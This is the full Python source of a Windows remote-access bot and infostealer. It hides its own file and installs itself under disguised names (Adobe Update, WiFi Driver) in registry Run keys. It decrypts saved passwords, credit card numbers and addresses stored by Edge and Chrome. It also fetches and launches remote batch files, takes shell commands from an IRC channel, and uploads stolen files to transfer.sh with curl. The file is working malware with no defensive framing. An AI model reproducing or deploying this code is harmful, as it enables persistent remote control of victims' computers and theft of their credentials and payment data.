import requests
import subprocess, sys
import os
from os import environ, path
import socket
import json
import sqlite3
from Crypto.Cipher import AES
import shutil
import time
from time import time,sleep
import re
import base64
from base64 import b64decode
import win32crypt
import win32api
import win32con
from winreg import *

def autorun(tempdir, fileName, run):
    os.system('copy %s update.exe'%(fileName))
    os.system('copy update.exe %s\microsoft'%(tempdir))
    os.system('copy %s adobe.exe'%(fileName))
    os.system('copy adobe.exe %s\Adobe'%(tempdir))
    #cleanup
    os.system('rm adobe.exe')
    os.system('rm update.exe')
    key = OpenKey(HKEY_LOCAL_MACHINE, run)
    runkey =[]
    try:
        i = 0
        while True:
            subkey = EnumValue(key, i)
            runkey.append(subkey[0])
            i += 1
    except WindowsError:
        pass
 
    if 'Adobe Update' not in runkey:
        try:
            key= OpenKey(HKEY_LOCAL_MACHINE, run,0,KEY_ALL_ACCESS)
            SetValueEx(key ,'Adobe Update',0,REG_SZ,r"%appdata%\Adobe\adobe.exe")
            key.Close()
        except WindowsError:
            pass
    if 'Internet Update' not in runkey:
        try:
            key= OpenKey(HKEY_LOCAL_MACHINE, run,0,KEY_ALL_ACCESS)
            SetValueEx(key ,'Internet Update',0,REG_SZ,r"%appdata%\Microsoft\update.exe")
            key.Close()
        except WindowsError:
            pass
    if 'WiFi Driver' not in runkey:
        try:
            key= OpenKey(HKEY_LOCAL_MACHINE, run,0,KEY_ALL_ACCESS)
            SetValueEx(key ,'WiFi Driver',0,REG_SZ,r"%appdata%\Microsoft\wifi.exe")
            key.Close()
        except WindowsError:
            pass
def pers():
    tempdir = '%appdata%'
    fileName = sys.argv[0]
    run = "Software\Microsoft\Windows\CurrentVersion\Run"
    autorun(tempdir, fileName, run)
def hide():
    pwnfile = sys.argv[0]
    win32api.SetFileAttributes(pwnfile, win32con.FILE_ATTRIBUTE_HIDDEN)

public_ip = requests.get("https://api.ipify.org").text
public = public_ip.replace(".", "")
userpro = os.environ["USERNAME"]
ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);

def klean():
    tempdir = '%appdata%\Microsoft'
    os.system('move *.txt %s'%(tempdir))
def pong():
    ircsock.send("PONG :pingisn");
def grab():
        try:
            def get_encryption_key():
                local_state_path = os.path.join(os.environ["USERPROFILE"],
                                                "AppData", "Local", "Microsoft", "Edge",
                                                "User Data", "Local State")
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)

                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                key = key[5:]
                return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

            def decrypt_password(password, key):
                try:
                    iv = password[3:15]
                    password = password[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    return cipher.decrypt(password)[:-16].decode()
                except:
                    try:
                        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                    except:
                        return ""

            key = get_encryption_key()
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Microsoft", "Edge", "User Data", "default", "Login Data")
            filename = "EdgeData.db"
            shutil.copyfile(db_path, filename)
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_password(row[3], key)
                row[4]
                row[5]
                if username or password:
                    result = (f"\nOrigin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}")
                    f = open("elog.txt", "a")
                    f.write(result)
                    f.close()
                else:
                    continue
            cb_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Microsoft", "Edge", "User Data", "default", "Web Data")
            filename = "EdgeUata.db"
            shutil.copyfile(cb_path, filename)
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("select name_on_card, expiration_month, expiration_year, card_number_encrypted from credit_cards")
            for row in cursor.fetchall():
                name_on_card = row[0]
                expiration_month = row[1]
                expiration_year = row[2]
                card_number_encrypted = decrypt_password(row[3], key)
                if name_on_card or card_number_encrypted:
                    result = (f"Full: {name_on_card}\nEXP: {expiration_month}Year: {expiration_year}\nCard: {card_number_encrypted}")
                    f = open("ecc.txt", "a")
                    f.write(result)
                    f.close()
                else:
                    continue
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("select company_name, street_address, city, zipcode, country_code from autofill_profiles")
            for row in cursor.fetchall():
                company_name = row[0]
                street_address = row[1]
                city = row[2]
                zipcode= row[3]
                country_code = row[4]
                if company_name or zipcode:
                    result = (f"Company Name: {company_name}\nStreet Address: {street_address}\nCity: {city}\nZip Code: {zipcode}\nCountry Code: {country_code}")
                    f = open("efull.txt", "a")
                    f.write(result)
                    f.close()
                else:
                    continue
            cursor.close()
            db.close()
            try:
                os.remove('EdgeData.db')
                os.remove('EdgeUata.db')
                os.remove('EdgeData.db')
            except:
                pass
        except Exception as e:
            print(e)
            tempdir = '%appdata%\Microsoft'
            os.system('move elog.txt %s'%(tempdir))
            os.system('move ecc.txt %s'%(tempdir))
            os.system('move efull.txt %s'%(tempdir))
        #############Chrome Grab
        try:
            def get_encryption_key():
                local_state_path = os.path.join(os.environ["USERPROFILE"],
                                                "AppData", "Local", "Google", "Chrome",
                                                "User Data", "Local State")
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)

                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                key = key[5:]
                return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

            def decrypt_password(password, key):
                try:
                    iv = password[3:15]
                    password = password[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    return cipher.decrypt(password)[:-16].decode()
                except:
                    try:
                        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                    except:
                        return ""

            key = get_encryption_key()
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "default", "Login Data")
            filename = "ChromeData.db"
            shutil.copyfile(db_path, filename)
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_password(row[3], key)
                row[4]
                row[5]
                if username or password:
                    result = (f"\nOrigin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}")
                    f = open("clog.txt", "a")
                    f.write(result)
                    f.close()
                    os.remove('ChromeData.db')
                else:
                    continue
            cb_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "default", "Web Data")
            filename = "ChromeUata.db"
            shutil.copyfile(cb_path, filename)
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("select name_on_card, expiration_month, expiration_year, card_number_encrypted from credit_cards")
            for row in cursor.fetchall():
                name_on_card = row[0]
                expiration_month = row[1]
                expiration_year = row[2]
                card_number_encrypted = decrypt_password(row[3], key)
                if name_on_card or card_number_encrypted:
                    result = (f"Full: {name_on_card}\nEXP: {expiration_month}Year: {expiration_year}\nCard: {card_number_encrypted}")
                    f = open("ccc.txt", "a")
                    f.write(result)
                    f.close()
                else:
                    continue
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("select company_name, street_address, city, zipcode, country_code from autofill_profiles")
            for row in cursor.fetchall():
                company_name = row[0]
                street_address = row[1]
                city = row[2]
                zipcode= row[3]
                country_code = row[4]
                if company_name or zipcode:
                    result = (f"Company Name: {company_name}\nStreet Address: {street_address}\nCity: {city}\nZip Code: {zipcode}\nCountry Code: {country_code}")
                    f = open("cfull.txt", "a")
                    f.write(result)
                    f.close()
                else:
                    continue
            cursor.close()
            db.close()
            try:
                os.remove(filename)
                os.remove('ChromeUata.db')
            except:
                pass
        except Exception as e:
            print(e)
            tempdir = '%appdata%\Microsoft'
            os.system('move clog.txt %s'%(tempdir))
            os.system('move ccc.txt %s'%(tempdir))
            os.system('move cfull.txt %s'%(tempdir))
def sys():
        win32api.SetFileAttributes("sys.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
def drop():
        tempdir = '%appdata%\Microsoft'
        os.system('curl https://raw.githubusercontent.com/nrikas/getsysteminfo/main/lol.bat -o wifi.exe')
        os.system('copy wifi.exe %s'%(tempdir))
        os.system('start %s\wifi.exe'%(tempdir))
def getsys():
        os.system('curl https://raw.githubusercontent.com/nrikas/getsysteminfo/main/get.bat -o sys.bat')
        os.system('start sys.bat')
        win32api.SetFileAttributes("sys.bat", win32con.FILE_ATTRIBUTE_HIDDEN)
#autorun
#pers()
#grab()
hide()
#klean()

#
def connect():
    server = "irc.libera.chat"; 
    channel = "#ghostircpwned";
    botnick = ""+userpro+""+public+"";
    ircsock.connect((server, 6667)); 
    sendstr = "USER "+botnick+" "+botnick+" "+botnick+" :PwnedIP "+public_ip+"\r\n";
    ircsock.sendall((sendstr).encode('utf-8'));

    ircsock.sendall(("NICK "+ botnick +"\r\n").encode('utf-8')) 

    while 1:
        ircmsg = ircsock.recv(2048).decode("utf-8")
        print (ircmsg);
        if ircmsg.find ( 'PING' ) != -1:
            ircsock.sendall(( 'PONG ' + ircmsg.split() [ 1 ] + '\r\n' ).encode('utf-8'))
            last_ping = time()
            break;

def joinchan(chan):
    ircsock.sendall(("JOIN "+chan+"\r\n").encode('utf-8'))
    ircmsg = ""
    while 1:
        ircmsg = ircsock.recv(2048).decode("utf-8")
        ircmsg = ircmsg.strip("\n\r")
        print(ircmsg)
        if ircmsg.find ( 'PING' ) != -1:
            ircsock.sendall(( 'PONG ' + ircmsg.split() [ 1 ] + '\r\n' ).encode('utf-8'))
            last_ping = time()
        if ircmsg.lower().find(":@hi") != -1:
            ircsock.send(("PRIVMSG " + chan +" :Hi, i am pwned\r\n" ).encode('utf-8'))
            ircsock.send(("PRIVMSG " + chan +" :My Commands\r\n" ).encode('utf-8'))
            ircsock.send(("PRIVMSG " + chan +" :To DW @cmd curl --upload-file ./hello.txt https://transfer.sh/hello.txt\r\n" ).encode('utf-8'))
            ircsock.send(("PRIVMSG " + chan +" :@cmd\r\n" ).encode('utf-8'))
            ircsock.send(("PRIVMSG " + chan +" :@sys to get localdir sys.txt\r\n" ).encode('utf-8'))
            ircsock.send(("PRIVMSG " + chan +" :@nux pyshell\r\n" ).encode('utf-8'))
            ircsock.send(("PRIVMSG " + chan +" :@message send message here\r\n" ).encode('utf-8'))
            ircsock.send(("PRIVMSG " + chan +" :@rd sys.txt\r\n" ).encode('utf-8'))
            ircsock.send(("PRIVMSG " + chan +" :@drop drops bsod btc\r\n" ).encode('utf-8'))
            ircsock.send(("PRIVMSG " + chan +" :@grab browserinfo\r\n" ).encode('utf-8'))
        if ircmsg.lower().find(":@cmd") != -1:
            cmd = ircmsg.lower()[ircmsg.lower().find(":@cmd")+5:len(str(ircmsg))];
            stream = os.popen(cmd)
            output = stream.read()
            ircsock.sendall(("PRIVMSG " + chan + " :"+output+'\r'+'\n').encode('utf-8'));
        if ircmsg.lower().find(":@sys") != -1:
            sys = ircmsg.lower()[ircmsg.lower().find(":@sys")+5:len(str(ircmsg))];
            stream = os.popen('curl --upload-file ./sys.txt https://transfer.sh/sys.txt')
            output = stream.read()
            ircsock.sendall(("PRIVMSG " + chan + " :"+output+'\r'+'\n').encode('utf-8'));
        if ircmsg.lower().find(":@dump") != -1:
            dump = ircmsg.lower()[ircmsg.lower().find(":@dump")+5:len(str(ircmsg))];
            tempdir = '%appdata%\Microsoft'
            stream = os.popen('curl --upload-file .%s/dump.txt https://transfer.sh/dump.txt'%(tempdir))
            output = stream.read()
            ircsock.sendall(("PRIVMSG " + chan + " :"+output+'\r'+'\n').encode('utf-8'));
        if ircmsg.lower().find(":@nux") != -1:
            nux = ircmsg.lower()[ircmsg.lower().find(":@nux")+5:len(str(ircmsg))];
            null = os.pcmd(nux)
            outs = null.read()
            ircsock.sendall(("PRIVMSG " + chan + " :"+outs+'\r'+'\n').encode('utf-8'));
        if ircmsg.lower().find(":@message") != -1:
            cmd = ircmsg.lower()[ircmsg.lower().find(":@message")+10:len(str(ircmsg))];
            ircsock.sendall(("PRIVMSG " + chan + " :"+cmd+'\r'+'\n').encode('utf-8'))
        if ircmsg.lower().find(":@ping") != -1:
            cmd = ircmsg.lower()[ircmsg.lower().find(":@ping")+7:len(str(ircmsg))];
            pong()
        if ircmsg.lower().find(":@rd") != -1:
            cmd = ircmsg.lower()[ircmsg.lower().find(":@rd")+7:len(str(ircmsg))];
            getsys()
            tempdir = '%appdata%\Microsoft'
            stream = os.popen('curl --upload-file %s/sys.txt https://transfer.sh/sys.txt'%(tempdir))
            output = stream.read()
            ircsock.sendall(("PRIVMSG " + chan + " :"+output+'\r'+'\n').encode('utf-8'));
        if ircmsg.lower().find(":@drop") != -1:
            cmd = ircmsg.lower()[ircmsg.lower().find(":@drop")+7:len(str(ircmsg))];
            drop()
            ircsock.send(("PRIVMSG " + chan +" :Files Dropped\r\n" ).encode('utf-8'))
        if ircmsg.lower().find(":@system") != -1:
            cmd = ircmsg.lower()[ircmsg.lower().find(":@system")+7:len(str(ircmsg))];
            sys()
        if ircmsg.lower().find(":@grab") != -1:
            cmd = ircmsg.lower()[ircmsg.lower().find(":@grab")+7:len(str(ircmsg))];
            grab()
            ircsock.send(("PRIVMSG " + chan +" :Browser Pwned\r\n" ).encode('utf-8'))
        if ircmsg.lower().find(":@exit") != -1:
            ircsock.shutdown(socket.SHUT_RDWR)

##retry
chan = '#ghostircpwned'
#time.sleep(30+random.randint(0,60))
connect()
sleep(40);
joinchan('#ghostircpwned1')
